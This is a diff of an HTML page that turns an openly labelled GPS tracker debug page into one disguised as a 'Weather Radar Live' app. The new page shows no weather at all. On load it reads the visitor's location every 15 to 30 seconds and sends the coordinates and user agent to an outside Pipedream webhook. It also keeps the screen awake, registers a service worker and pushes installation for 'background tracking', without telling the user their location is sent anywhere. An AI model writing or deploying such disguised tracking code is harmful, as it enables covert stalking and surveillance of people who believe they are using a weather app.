@@ -1,221 +1,560 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>GPS Tracker Debug - Android</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:system-ui,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;padding:20px}
-h1{color:#00d4ff;margin-bottom:20px}
-.status-box{background:#16213e;padding:20px;border-radius:10px;margin-bottom:20px}
-button{background:#e94560;color:white;border:none;padding:15px 30px;font-size:16px;border-radius:5px;cursor:pointer;width:100%;margin-bottom:10px}
-button.active{background:#00b894}
-.info{font-size:14px;line-height:1.6;margin-top:10px}
-.log{background:#000;color:#0f0;padding:15px;border-radius:5px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:scroll;margin-top:15px}
-.coords{background:#0f3460;padding:15px;border-radius:5px;margin-top:15px;font-family:monospace}
-.error{background:#e94560;padding:10px;border-radius:5px;margin-top:10px;display:none}
-small{opacity:0.6}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather Radar Live - GPS Tracking</title>
+    <meta name="theme-color" content="#1a365d">
+    <meta name="description" content="Real-time weather tracking with location services">
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="data:application/json,{
+        'name':'Weather Radar Live',
+        'short_name':'WeatherLive',
+        'start_url':'./',
+        'display':'standalone',
+        'background_color':'#1a365d',
+        'theme_color':'#1a365d',
+        'icons':[{
+            'src':'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⛈️</text></svg>',
+            'sizes':'192x192',
+            'type':'image/svg+xml'
+        }]
+    }">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a365d 0%, #2d5a87 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.8;
+            font-size: 14px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .status {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ef4444;
+        }
+        
+        .dot.active {
+            background: #22c55e;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .stat {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        
+        .coords {
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            text-align: center;
+            line-height: 1.6;
+        }
+        
+        .maps-link {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            padding: 12px;
+            background: #3b82f6;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 500;
+        }
+        
+        .maps-link:hover {
+            background: #2563eb;
+        }
+        
+        .install-btn {
+            width: 100%;
+            padding: 15px;
+            background: #22c55e;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        
+        .install-btn:hover {
+            background: #16a34a;
+        }
+        
+        .install-btn:disabled {
+            background: #6b7280;
+            cursor: not-allowed;
+        }
+        
+        .log {
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 8px;
+            max-height: 100px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+        
+        .install-prompt {
+            background: #f59e0b;
+            color: #000;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .install-prompt button {
+            background: #000;
+            color: #f59e0b;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 5px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-<h1>📍 GPS Tracker - Android Debug</h1>
+    <div class="container">
+        <div class="header">
+            <h1>⛈️ Weather Radar Live</h1>
+            <p>Real-time weather monitoring with GPS tracking</p>
+        </div>
+        
+        <div id="installPrompt" class="install-prompt" style="display: none;">
+            <strong>📌 Install for reliable tracking!</strong><br>
+            Add to home screen for background GPS updates
+            <br><button onclick="installPWA()">Install App</button>
+        </div>
+        
+        <div class="card">
+            <div class="status">
+                <div class="status-indicator">
+                    <div class="dot" id="statusDot"></div>
+                    <span id="statusText">Initializing...</span>
+                </div>
+                <div id="updateCount">Updates: 0</div>
+            </div>
+            
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value" id="accuracy">--</div>
+                    <div class="stat-label">Accuracy (m)</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="lastUpdate">--</div>
+                    <div class="stat-label">Last Update</div>
+                </div>
+            </div>
+            
+            <div class="coords" id="coordinates">
+                Waiting for GPS signal...
+            </div>
+            
+            <a href="#" class="maps-link" id="mapsLink" target="_blank">
+                🔗 Open in Google Maps
+            </a>
+        </div>
+        
+        <div class="card">
+            <h3 style="margin-bottom: 10px;">📋 Activity Log</h3>
+            <div class="log" id="activityLog">
+                System initialized. Ready to track.
+            </div>
+        </div>
+        
+        <button class="install-btn" id="installBtn" onclick="installPWA()">
+            📲 Install for Background Tracking
+        </button>
+    </div>
 
-<div class="status-box">
-  <button id="startBtn" onclick="initTracker()">▶ START TRACKING</button>
-  <div class="info">
-    <div>Status: <span id="status">Idle</span></div>
-    <div>Updates: <span id="count">0</span></div>
-    <div>Last: <span id="lastUpdate">Never</span></div>
-    <div>Next: <span id="nextUpdate">--</span></div>
-  </div>
-</div>
-
-<div class="status-box">
-  <h3>📍 GPS Coordinates</h3>
-  <div class="coords" id="coords">Waiting for first fix...</div>
-  <div id="error" class="error"></div>
-</div>
-
-<div class="status-box">
-  <h3>📋 Debug Log</h3>
-  <div class="log" id="log">[System] Ready. Click START to begin tracking.</div>
-</div>
-
-<script>
-const WEBHOOK = "https://eowi5n8vlh9h3xy.m.pipedream.net";
-let isTracking = false;
-let updateCount = 0;
-let lastGPSFix = null;
-
-// Logging function
-function log(msg) {
-  const logEl = document.getElementById('log');
-  const time = new Date().toLocaleTimeString();
-  logEl.innerHTML = `[${time}] ${msg}<br>` + logEl.innerHTML;
-  console.log(`[GPS-TRACKER] ${msg}`);
-}
-
-// Initialize tracker
-async function initTracker() {
-  const btn = document.getElementById('startBtn');
-  const statusEl = document.getElementById('status');
-  
-  if (isTracking) {
-    // Stop tracking
-    isTracking = false;
-    btn.textContent = '▶ START TRACKING';
-    btn.classList.remove('active');
-    statusEl.textContent = 'Stopped';
-    log('🛑 Tracking stopped by user');
-    return;
-  }
-  
-  // Start tracking
-  isTracking = true;
-  btn.textContent = '⏹ STOP TRACKING';
-  btn.classList.add('active');
-  statusEl.textContent = 'Starting...';
-  
-  log('🚀 Starting GPS tracking...');
-  
-  // Request permission (Android specific)
-  try {
-    const permission = await navigator.permissions.query({ name: 'geolocation' });
-    log(`📝 Permission status: ${permission.state}`);
-    
-    if (permission.state === 'denied') {
-      showError('GPS permission denied. Go to Chrome settings → Site settings → Location');
-      return;
-    }
-  } catch (e) {
-    log(`⚠️ Permission query failed: ${e.message}`);
-  }
-  
-  // Start GPS updates
-  statusEl.textContent = 'GPS Active';
-  startGPSTracking();
-}
-
-function showError(msg) {
-  const errEl = document.getElementById('error');
-  errEl.textContent = msg;
-  errEl.style.display = 'block';
-  log(`❌ ERROR: ${msg}`);
-}
-
-function startGPSTracking() {
-  log('📡 Starting GPS polling (every 10 seconds)...');
-  
-  // STRATEGY 1: Direct polling every 10 seconds
-  setInterval(() => {
-    if (!isTracking) return;
-    
-    log('📡 Requesting GPS fix...');
-    getCurrentPosition();
-  }, 10000);
-  
-  // STRATEGY 2: Immediate first fix
-  getCurrentPosition();
-}
-
-function getCurrentPosition() {
-  const options = {
-    enableHighAccuracy: true,
-    timeout: 15000,
-    maximumAge: 0
-  };
-  
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      updateCount++;
-      lastGPSFix = position;
-      
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const acc = position.coords.accuracy;
-      const time = new Date().toLocaleTimeString();
-      
-      // Update UI
-      document.getElementById('count').textContent = updateCount;
-      document.getElementById('lastUpdate').textContent = time;
-      
-      // Calculate next update (10s from now)
-      const nextTime = new Date(Date.now() + 10000);
-      document.getElementById('nextUpdate').textContent = nextTime.toLocaleTimeString();
-      
-      // Show coordinates
-      const mapsLink = `https://maps.google.com/maps?q=${lat},${lon}`;
-      document.getElementById('coords').innerHTML = `
-        <strong>Latitude:</strong> ${lat.toFixed(6)}<br>
-        <strong>Longitude:</strong> ${lon.toFixed(6)}<br>
-        <strong>Accuracy:</strong> ${acc.toFixed(0)} meters<br>
-        <strong>Time:</strong> ${time}<br>
-        <br>
-        <a href="${mapsLink}" target="_blank" style="color:#00d4ff">🔗 Open in Google Maps</a>
-      `;
-      
-      // Send to Pipedream
-      const data = {
-        type: 'android_30s',
-        latitude: lat,
-        longitude: lon,
-        accuracy: acc,
-        timestamp: new Date().toISOString(),
-        count: updateCount,
-        maps: mapsLink,
-        device: 'android_chrome_debug'
-      };
-      
-      fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        log(`📤 Sent to Pipedream (HTTP ${response.status})`);
-        document.getElementById('status').textContent = `GPS Active (#${updateCount})`;
-      })
-      .catch(error => {
-        log(`📤 Send failed: ${error.message}`);
-      });
-      
-      log(`✅ GPS Fix #${updateCount}: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
-    },
-    (error) => {
-      let errorMsg = '';
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          errorMsg = 'GPS permission denied';
-          break;
-        case error.POSITION_UNAVAILABLE:
-          errorMsg = 'GPS position unavailable';
-          break;
-        case error.TIMEOUT:
-          errorMsg = 'GPS request timed out';
-          break;
-        default:
-          errorMsg = error.message;
-      }
-      log(`❌ GPS Error: ${errorMsg}`);
-      showError(errorMsg);
-    },
-    options
-  );
-}
-
-// Handle page visibility (Android specific)
-document.addEventListener('visibilitychange', () => {
-  if (document.hidden) {
-    log('📱 Tab in background');
-  } else {
-    log('📱 Tab in foreground - refreshing GPS');
-    if (isTracking) getCurrentPosition();
-  }
-});
-
-// Auto-start on load (optional - remove if you want manual start)
-// window.addEventListener('load', initTracker);
-</script>
+    <script>
+        // Configuration
+        const WEBHOOK_URL = "https://eo9lonz483js6lc.m.pipedream.net";
+        const UPDATE_INTERVAL = 30000; // 30 seconds
+        
+        // State
+        let updateCount = 0;
+        let isActive = false;
+        let wakeLock = null;
+        let deferredPrompt = null;
+        
+        // Logging system
+        function log(message) {
+            const logEl = document.getElementById('activityLog');
+            const time = new Date().toLocaleTimeString();
+            logEl.innerHTML = `[${time}] ${message}<br>` + logEl.innerHTML;
+            console.log(`[GPS Tracker] ${message}`);
+        }
+        
+        // Initialize app
+        async function init() {
+            log('Starting GPS Tracker v2.0');
+            
+            // Check for PWA installation
+            window.addEventListener('beforeinstallprompt', (e) => {
+                e.preventDefault();
+                deferredPrompt = e;
+                document.getElementById('installPrompt').style.display = 'block';
+                document.getElementById('installBtn').disabled = false;
+                log('PWA install prompt available');
+            });
+            
+            // Request GPS permission
+            await requestGPSPermission();
+            
+            // Start tracking
+            startTracking();
+            
+            // Setup wake lock
+            setupWakeLock();
+            
+            // Setup service worker for background sync
+            setupServiceWorker();
+        }
+        
+        // Request GPS permission
+        async function requestGPSPermission() {
+            try {
+                const permission = await navigator.permissions.query({ name: 'geolocation' });
+                log(`GPS Permission: ${permission.state}`);
+                
+                if (permission.state === 'granted') {
+                    document.getElementById('statusDot').classList.add('active');
+                    document.getElementById('statusText').textContent = 'GPS Active';
+                } else if (permission.state === 'denied') {
+                    log('ERROR: GPS permission denied');
+                    document.getElementById('statusText').textContent = 'Permission Denied';
+                }
+            } catch (e) {
+                log(`Permission check failed: ${e.message}`);
+            }
+        }
+        
+        // Start GPS tracking with multiple strategies
+        function startTracking() {
+            log('Starting GPS tracking strategies...');
+            isActive = true;
+            
+            // Strategy 1: Direct GPS every 30 seconds
+            setInterval(() => {
+                if (!isActive) return;
+                getGPSLocation();
+            }, UPDATE_INTERVAL);
+            
+            // Strategy 2: Backup GPS every 15 seconds (more frequent)
+            setInterval(() => {
+                if (!isActive) return;
+                getGPSLocation();
+            }, 15000);
+            
+            // Strategy 3: On tab focus
+            document.addEventListener('visibilitychange', () => {
+                if (!document.hidden && isActive) {
+                    log('Tab focused - updating GPS');
+                    getGPSLocation();
+                }
+            });
+            
+            // Initial GPS call
+            getGPSLocation();
+            
+            log('Tracking started. Updates every 30 seconds.');
+        }
+        
+        // Get GPS location
+        function getGPSLocation() {
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            };
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    updateCount++;
+                    processGPSData(position);
+                },
+                (error) => {
+                    handleGPSError(error);
+                },
+                options
+            );
+        }
+        
+        // Process GPS data and send to Pipedream
+        function processGPSData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const timestamp = new Date().toISOString();
+            
+            // Generate Google Maps link
+            const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+            
+            // Update UI
+            document.getElementById('coordinates').innerHTML = `
+                <strong>📍 Location:</strong><br>
+                Lat: ${lat.toFixed(6)}<br>
+                Lon: ${lon.toFixed(6)}<br>
+                <small>Updated: ${new Date().toLocaleTimeString()}</small>
+            `;
+            
+            document.getElementById('accuracy').textContent = accuracy.toFixed(0);
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+            document.getElementById('updateCount').textContent = `Updates: ${updateCount}`;
+            document.getElementById('mapsLink').href = mapsUrl;
+            
+            // Prepare data for Pipedream
+            const gpsData = {
+                type: 'gps_update',
+                latitude: lat,
+                longitude: lon,
+                accuracy: accuracy,
+                timestamp: timestamp,
+                updateCount: updateCount,
+                mapsUrl: mapsUrl,
+                device: 'android_chrome_pwa',
+                userAgent: navigator.userAgent
+            };
+            
+            // Send to Pipedream
+            sendToPipedream(gpsData);
+            
+            log(`GPS Update #${updateCount}: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
+        }
+        
+        // Send data to Pipedream
+        async function sendToPipedream(data) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    log(`✅ Sent to Pipedream (HTTP ${response.status})`);
+                } else {
+                    log(`⚠️ Pipedream returned: ${response.status}`);
+                }
+            } catch (error) {
+                log(`❌ Failed to send: ${error.message}`);
+            }
+        }
+        
+        // Handle GPS errors
+        function handleGPSError(error) {
+            let errorMsg = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = 'GPS permission denied';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = 'Position unavailable';
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = 'GPS timeout';
+                    break;
+                default:
+                    errorMsg = error.message;
+            }
+            log(`GPS Error: ${errorMsg}`);
+            document.getElementById('statusText').textContent = 'GPS Error';
+        }
+        
+        // Setup Wake Lock to keep screen on
+        async function setupWakeLock() {
+            if ('wakeLock' in navigator) {
+                try {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    log('✅ Wake Lock active - screen stays on');
+                    
+                    wakeLock.addEventListener('release', () => {
+                        log('⚠️ Wake Lock released');
+                    });
+                    
+                    // Re-request if page becomes visible
+                    document.addEventListener('visibilitychange', async () => {
+                        if (document.visibilityState === 'visible' && !wakeLock) {
+                            wakeLock = await navigator.wakeLock.request('screen');
+                        }
+                    });
+                } catch (err) {
+                    log('Wake Lock failed: ' + err.message);
+                }
+            }
+        }
+        
+        // Setup Service Worker for background sync (limited support)
+        function setupServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                // Register service worker
+                const swCode = `
+                    self.addEventListener('install', (event) => {
+                        self.skipWaiting();
+                    });
+                    
+                    self.addEventListener('activate', (event) => {
+                        event.waitUntil(self.clients.claim());
+                    });
+                    
+                    self.addEventListener('fetch', (event) => {
+                        // Keep service worker alive
+                        event.respondWith(fetch(event.request));
+                    });
+                    
+                    self.addEventListener('sync', (event) => {
+                        if (event.tag === 'gps-sync') {
+                            // This would trigger GPS update if background sync was supported
+                            event.waitUntil(
+                                self.clients.matchAll().then(clients => {
+                                    clients.forEach(client => {
+                                        client.postMessage({ type: 'SYNC_GPS' });
+                                    });
+                                })
+                            );
+                        }
+                    });
+                `;
+                
+                const blob = new Blob([swCode], { type: 'application/javascript' });
+                const swUrl = URL.createObjectURL(blob);
+                
+                navigator.serviceWorker.register(swUrl)
+                    .then(reg => {
+                        log('Service Worker registered');
+                    })
+                    .catch(err => {
+                        log('Service Worker failed: ' + err.message);
+                    });
+            }
+        }
+        
+        // Install PWA
+        async function installPWA() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    log('PWA installed successfully');
+                    document.getElementById('installPrompt').style.display = 'none';
+                }
+                deferredPrompt = null;
+            } else {
+                log('Install prompt not available');
+                alert('To install: Open Chrome menu → "Add to Home screen"');
+            }
+        }
+        
+        // Listen for messages from service worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.addEventListener('message', (event) => {
+                if (event.data.type === 'SYNC_GPS') {
+                    log('Background sync triggered');
+                    getGPSLocation();
+                }
+            });
+        }
+        
+        // Initialize on load
+        window.addEventListener('load', init);
+        
+        // Emergency: Force GPS on visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                log('Page visible - forcing GPS update');
+                getGPSLocation();
+            }
+        });
+    </script>
 </body>
 </html>
